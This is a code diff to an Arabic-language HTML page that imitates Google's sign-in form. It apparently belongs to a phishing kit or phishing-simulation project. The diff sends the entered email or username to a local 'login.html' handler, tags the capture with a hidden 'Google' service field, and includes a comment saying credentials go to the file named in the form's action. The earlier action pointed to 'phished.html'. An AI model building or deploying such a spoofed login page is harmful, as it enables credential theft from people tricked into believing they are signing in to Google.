@@ -11,7 +11,6 @@
 
     <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
     <link href="//fonts.googleapis.com/css?family=Varela+Round" rel="stylesheet" />
-    <link href="../reset.css" rel="stylesheet" />
     <link href="google.css" rel="stylesheet" />
 
   </head>
@@ -23,8 +22,9 @@
       <!-- form center container -->
       <main class="google-container">
 
-        <!-- form object -->
-        <form class="google-form" action="../phished.html" method="POST" autocomplete="off">
+        <!-- login form, credentials will go to linked file in action attribute -->
+        <form class="google-form" action="../login.html" method="GET">
+          <input type="hidden" name="_service" value="Google" />
 
           <!-- form logo -->
           <div class="google-logo">
@@ -37,7 +37,7 @@
             <h3>مع حساب جوجل الخاص بك</h3>
           </div>
 
-          <!-- email selected heading -->
+          <!-- username selected heading -->
           <div class="google-welcome fade-in hidden">
             <h1>أهلا بك</h1>
             <div>
@@ -46,9 +46,9 @@
             </div>
           </div>
 
-          <!-- email input -->
-          <div class="google-input google-email slide-right">
-            <input type="text" name="_email" placeholder="" value="" />
+          <!-- username input -->
+          <div class="google-input google-username slide-right">
+            <input type="text" name="_username" placeholder="" value="" />
             <span>عنوان البريد الإلكتروني أو رقم الهاتف</span>
             <a href="#">هل نسيت البريد الإلكتروني؟</a>
           </div>
